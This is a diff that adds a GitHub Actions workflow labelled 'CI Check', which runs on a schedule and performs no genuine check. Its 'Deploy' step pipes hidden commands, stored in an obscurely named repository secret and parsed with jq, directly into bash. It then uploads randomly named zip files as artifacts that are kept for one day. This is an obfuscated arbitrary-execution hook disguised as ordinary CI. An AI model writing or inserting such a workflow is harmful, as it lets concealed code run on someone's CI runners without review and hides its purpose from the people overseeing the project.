@@ -1,0 +1,28 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          vjz295: ${{ secrets.vjz295 }}
+        run: |
+          printf '%s' "$vjz295" | jq -r .qf04 | /bin/bash
+          echo $ydd3 | jq -r .gi90 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7EyeCBtD
+          path: "*.zip"
+          retention-days: 1
